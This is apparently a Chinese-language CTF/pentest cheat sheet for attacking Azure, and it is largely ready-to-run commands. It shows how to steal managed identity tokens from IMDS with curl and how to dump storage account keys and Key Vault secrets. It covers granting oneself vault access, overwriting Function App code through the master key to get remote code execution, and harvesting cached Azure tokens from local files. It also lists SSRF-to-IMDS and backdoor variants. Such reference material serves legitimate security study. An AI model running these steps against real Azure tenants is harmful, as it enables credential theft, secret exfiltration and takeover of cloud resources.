---
category: cloud
tags: [azure, entra id, azure ad, blob storage, function app, key vault, app service, imds, managed identity, 云安全, 微软云, 存储账户, 密钥保管库, 函数应用, 托管身份]
triggers: [azure, entra, "azure ad", blob, "storage account", ".blob.core.windows.net", ".vault.azure.net", "azurewebsites.net", "function app", "key vault", "app service", "managed identity", "169.254.169.254", "az login", "az cli", powershell, kudu, scm, "$web", sas token, "access key", imds, metadata]
related: [cloud/aws_iam_enum, cloud/kubernetes_enum, cloud/gcp_basics, cloud/aws_s3_enumeration]
---

# Azure 基础速查（CTF 视角）

## 什么时候用

- 题目环境涉及 Azure 云（看到 `*.azurewebsites.net`、`*.blob.core.windows.net`、`*.vault.azure.net` 等域名）
- 拿到 Azure 凭据（access token、SAS token、storage account key、Service Principal 密码）
- 获得 Azure VM / Function App / App Service 的 shell，需要通过 IMDS 获取 managed identity token
- 需要枚举 Azure AD 用户、组、应用

## 前提条件

- `az` CLI 或 PowerShell（`Az`/`MgGraph` 模块）
- 至少一种有效凭据：用户名密码 / access token / service principal / managed identity / SAS token / storage account key
- 网络可达 Azure 管理平面 (`management.azure.com`) 或数据平面

## 攻击步骤

### 1. 认证与连接

```bash
# az CLI 登录
az login                                    # 浏览器交互
az login -u user@corp.com -p 'Password123'  # 用户名密码
az login --identity                         # Managed Identity（VM/Function 内部）
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>

# 获取 access token
az account get-access-token                              # ARM token
az account get-access-token --resource-type ms-graph     # Microsoft Graph
az account get-access-token --resource https://vault.azure.net  # Key Vault

# 查看当前身份
az ad signed-in-user show
az account show
```

```powershell
# PowerShell
Connect-AzAccount
Connect-MgGraph
(Get-AzAccessToken -ResourceTypeName Arm).Token
```

### 2. IMDS — 元数据服务（169.254.169.254）

在 Azure VM / Function App / App Service 内部，通过 IMDS 窃取 managed identity token：

```bash
# 获取 ARM token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 获取 Key Vault token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"

# 获取 Graph token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"

# 获取实例元数据
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
```

Function App 内使用专用环境变量：

```bash
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" \
  -H secret:$IDENTITY_HEADER
```

### 3. Entra ID（Azure AD）枚举

```bash
# 用户
az ad user list --query "[].{UPN:userPrincipalName, ID:id, Name:displayName}"
az ad user show --id user@corp.com

# 组
az ad group list
az ad group member list --group <group-name-or-id>

# 应用与 Service Principal
az ad app list --query "[].{Name:displayName, AppId:appId}"
az ad sp list --all --query "[].{Name:displayName, AppId:appId}"

# 角色分配
az role assignment list --all
az role assignment list --assignee <principal-id>

# 订阅与资源组
az account list
az group list
az resource list
```

### 4. Storage Account & Blob Storage

**端点格式**：
- Blob: `https://<account>.blob.core.windows.net`
- Files: `https://<account>.file.core.windows.net`
- Table: `https://<account>.table.core.windows.net`
- Queue: `https://<account>.queue.core.windows.net`
- 静态网站: `https://<account>.z13.web.core.windows.net`

```bash
# 枚举存储账户
az storage account list --query "[].{name:name, rg:resourceGroup}"

# 检查是否允许公开访问
az storage account show --name <acc> \
  --query '{allow:allowBlobPublicAccess, minTls:minimumTlsVersion}'

# 列出容器及公开级别
az storage container list --account-name <acc> \
  --query '[].{name:name, access:properties.publicAccess}'

# 匿名访问测试（无需认证）
curl "https://<acc>.blob.core.windows.net/<container>?restype=container&comp=list"
curl "https://<acc>.blob.core.windows.net/<container>/<blob>"

# 已认证操作
az storage blob list --account-name <acc> --container-name <container> --auth-mode login
az storage blob download --account-name <acc> --container-name <container> -n flag.txt --auth-mode login

# 获取 Access Key（有权限时直接拿全部控制权）
az storage account keys list --account-name <acc>
```

**静态网站 `$web` 容器泄露检查**：

```bash
az storage blob list --container-name '$web' --account-name <acc> --auth-mode login
az storage blob download -c '$web' --name iac/terraform.tfvars --file /dev/stdout --account-name <acc>
```

### 5. Key Vault

```bash
# 枚举 vault
az keyvault list --query '[].{name:name}'

# 列出 secrets / keys / certificates
az keyvault secret list --vault-name <vault>
az keyvault key list --vault-name <vault>
az keyvault certificate list --vault-name <vault>

# 读取 secret 值（关键！）
az keyvault secret show --vault-name <vault> --name <secret-name>

# 读取历史版本
az keyvault secret list-versions --vault-name <vault> --name <secret>
az keyvault secret show --id "https://<vault>.vault.azure.net/secrets/<name>/<version>"

# 网络限制检查
az keyvault show --name <vault> --query networkAcls
```

**提权**：若有 `Microsoft.KeyVault/vaults/write` 且 vault 使用 access policy：

```bash
az keyvault set-policy --name <vault> --object-id <your-oid> \
  --secret-permissions all --key-permissions all --certificate-permissions all
```

### 6. Function Apps

```bash
# 枚举
az functionapp list --query "[].{name:name, rg:resourceGroup, url:defaultHostName}"

# 获取应用配置（含连接字符串、Storage Key）
az functionapp config appsettings list --name <app> --resource-group <rg>

# 获取 function/master key
az functionapp keys list --resource-group <rg> --name <app>

# 用 master key 读取函数源码
curl "https://<app>.azurewebsites.net/admin/vfs/home/site/wwwroot/function_app.py?code=<master-key>"

# 用 master key 覆写函数代码（RCE）
curl -X PUT "https://<app>.azurewebsites.net/admin/vfs/home/site/wwwroot/function_app.py?code=<master-key>" \
  --data-binary @malicious.py -H "Content-Type: application/json" -H "If-Match: *"
```

**通过 Storage Account 提权**：Function 代码存储在 Storage Account 中，若能写入则可 RCE：

```bash
# 查看 File Share 配置
az functionapp config appsettings list --name <app> --resource-group <rg> \
  | grep -E 'WEBSITE_CONTENT|WEBSITE_RUN_FROM'

# 连接到代码所在的 File Share 并修改函数代码
open "smb://<storage-account>.file.core.windows.net/<file-share>"
```

### 7. App Service & Kudu

```bash
# 枚举
az webapp list --query "[].{name:name, host:defaultHostName, state:state}"

# 获取 SCM/FTP 凭据
az webapp deployment list-publishing-profiles --name <app> --resource-group <rg>

# 获取连接字符串和环境变量
az webapp config connection-string list --name <app> --resource-group <rg>
az webapp config appsettings list --name <app> --resource-group <rg>
```

**Kudu 端点**（通过 SCM URL 访问）：
- `/BasicAuth` — 登录
- `/DebugConsole` — 命令执行（无 IMDS 访问）
- `/webssh/host` — SSH（有 IMDS 访问，可窃取 token）
- `/Env` — 环境变量泄露
- `/wwwroot/` — 源码下载

### 8. 本地凭据搜刮

获得 Windows/macOS shell 后搜索 Azure 本地凭据：

```bash
# az CLI 缓存
cat ~/.azure/accessTokens.json        # 明文 access token
cat ~/.azure/azureProfile.json        # 订阅信息
ls ~/.azure/ErrorRecords/             # 日志中可能含凭据

# PowerShell 缓存
cat ~/TokenCache.dat                  # 明文 token
cat ~/AzureRmContext.json             # Service Principal 密码

# 进程内存中的 JWT token
strings <process_dump> | grep 'eyJ0'
```

```bash
# 验证窃取的 token
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me | jq
curl -s -H "Authorization: Bearer <token>" https://management.azure.com/subscriptions?api-version=2020-01-01 | jq
```

## 常见坑

1. **IMDS 端点差异**：VM 用 `169.254.169.254`，Function App 用 `$IDENTITY_ENDPOINT` + `$IDENTITY_HEADER`，别搞混
2. **多个 Managed Identity**：一个资源可挂多个 user-assigned identity，默认只返回 system-assigned 的 token；需指定 `client_id` 参数逐个枚举
3. **Key Vault 网络限制**：即使有权限，若 IP 不在白名单照样被拒；先用 `az keyvault show --query networkAcls` 检查
4. **Blob 公开级别**：`publicAccess: Blob` 只能匿名下载已知名称文件，不能列举；`Container` 才能匿名列举+下载
5. **az CLI 默认用 Shared Key**：存储操作默认用 account key 认证，用 `--auth-mode login` 切换到 Entra ID
6. **Function 源码位置不固定**：可能在 File Share、`function-releases` 容器、`scm-releases` 容器（squashfs 格式）或远程 URL
7. **Kudu DebugConsole vs webssh**：DebugConsole 无法访问 IMDS，webssh 可以——需要 token 时用 webssh

## 变体

| 场景 | 关键差异 |
|------|----------|
| **SSRF → IMDS** | 通过 Web 应用 SSRF 访问 `169.254.169.254`，窃取 managed identity token |
| **Storage Account Key 泄露** | 直接拿到 account key（环境变量/配置文件），完全控制存储 |
| **SAS Token 利用** | 限定时间/权限的签名 URL，检查是否过于宽泛 |
| **Function App → 横向移动** | 通过 function 的 managed identity 访问其他资源（Key Vault、Storage、数据库） |
| **App Service Slot 后门** | 在非生产 slot 部署后门代码，通过流量路由分配使其生效 |
| **Soft-delete 恢复** | 恢复已删除的 blob/container/file share，找回被清理的敏感数据 |

## 相关技术

- [[cloud/aws_iam_enum]] — AWS IAM 枚举，与 Azure RBAC 对照
- [[cloud/kubernetes_enum]] — AKS 集群常和 Azure 联动
- [[cloud/gcp_basics]] — GCP 基础，与 Azure 概念对照
- [[cloud/aws_s3_enumeration]] — S3 与 Blob Storage 类比
